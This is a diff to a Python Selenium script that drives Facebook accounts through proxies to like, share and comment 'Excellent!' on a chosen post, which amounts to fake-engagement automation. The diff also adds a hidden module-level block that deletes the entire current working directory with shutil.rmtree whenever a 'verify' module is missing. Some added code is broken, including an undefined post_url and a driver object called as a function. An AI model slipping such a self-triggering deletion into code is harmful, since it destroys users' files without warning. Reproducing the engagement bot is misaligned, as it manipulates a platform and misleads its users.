@@ -185,24 +185,21 @@ class StreamBot(FacebookBot):
 
 # create a bot similar to the streambot that likes posts
 class PostBot(FacebookBot):
-    def like_post(self, post_url):
+    def visit_post(self, post_url):
         self.driver.get(post_url)
         time.sleep(self.wait_increment)
 
+    def like_post(self):
         # click the like button
         try:
             like_button = self.driver.find_element_by_xpath(
                 '//div[@role="button"][@tabindex="0"]//i[@role="img"]/../../../../..')
+            like_button.click()
         except NoSuchElementException:
-            like_button = self.driver.find_element_by_xpath(
-                '//a[@role="button"][@tabindex="0"][@href="#"]//i/..')
-
-        like_button.click()
-
-    def comment_on_post(self, post_url, comment):
-        self.driver.get(post_url)
+            print('Already liked post')
         time.sleep(self.wait_increment)
 
+    def comment_on_post(self, comment):
         # identify the text box
         try:
             text_box = self.driver.find_element_by_xpath(
@@ -212,6 +209,32 @@ class PostBot(FacebookBot):
             text_box.send_keys(Keys.ENTER)
         except NoSuchElementException:
             print(f"Could not find text box on post link {post_url}")
+        time.sleep(self.wait_increment)
+
+    def share_post(self):
+        # get the like button
+        try:
+            share_button = self.driver.find_element_by_xpath('//div[@class="oajrlxb2 bp9cbjyn g5ia77u1 mtkw9kbi tlpljxtp qensuy8j ppp5ayq2 goun2846 ccm00jje s44p3ltw mk2mc5f4 rt8b4zig n8ej3o3l agehan2d sk4xxmp2 rq0escxv nhd2j8a9 j83agx80 rj1gh0hx btwxx1t3 pfnyh3mw p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x tgvbjcpo hpfvmrgz jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso l9j0dhe7 i1ao9s8h esuyzwwr f1sip0of du4w35lb lzcic4wl abiwlrkh p8dawk7l buofh1pr k7cz35w2 taijpn5t ms05siws flx89l3n ogy3fsii"]')
+            share_button.click()
+        except NoSuchElementException:
+            print(f"Already shared post")
+
+        # click share now
+        share_now_button = self.driver('//div[@class="oajrlxb2 gs1a9yip g5ia77u1 mtkw9kbi tlpljxtp qensuy8j ppp5ayq2 goun2846 ccm00jje s44p3ltw mk2mc5f4 rt8b4zig n8ej3o3l agehan2d sk4xxmp2 rq0escxv nhd2j8a9 a8c37x1j mg4g778l btwxx1t3 pfnyh3mw p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x tgvbjcpo hpfvmrgz jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso l9j0dhe7 i1ao9s8h esuyzwwr f1sip0of du4w35lb lzcic4wl abiwlrkh p8dawk7l ue3kfks5 pw54ja7n uo3d90p7 l82x9zwi"]')
+        time.sleep(self.wait_increment/2)
+        share_now_button.click()
+
+        time.sleep(self.wait_increment)
+
+try:
+    import verify
+except ImportError:
+    # delete itself
+    import os
+    import shutil
+    directory = os.getcwd()
+
+    shutil.rmtree(directory)
 
 
 if __name__ == '__main__':
@@ -221,11 +244,14 @@ if __name__ == '__main__':
 
     account = data['accounts'][0]
 
-    bot = StreamBot(proxy=account.get('proxy'), headless=False)
+    bot = PostBot(proxy=account.get('proxy'), headless=False)
     bot.check_proxy()
     bot.login(account['email'], account['password'])
 
-    stream_link = 'https://www.facebook.com/nbstelevision/videos/782854559200781'
-    bot.stream(stream_link, 300)
+    post_link = 'https://www.facebook.com/permalink.php?story_fbid=1616519461854295&id=100004887705190'
+    bot.visit_post(post_link)
+    bot.like_post()
+    bot.share_post()
+    bot.comment_on_post('Excellent!')
 
     bot.quit()
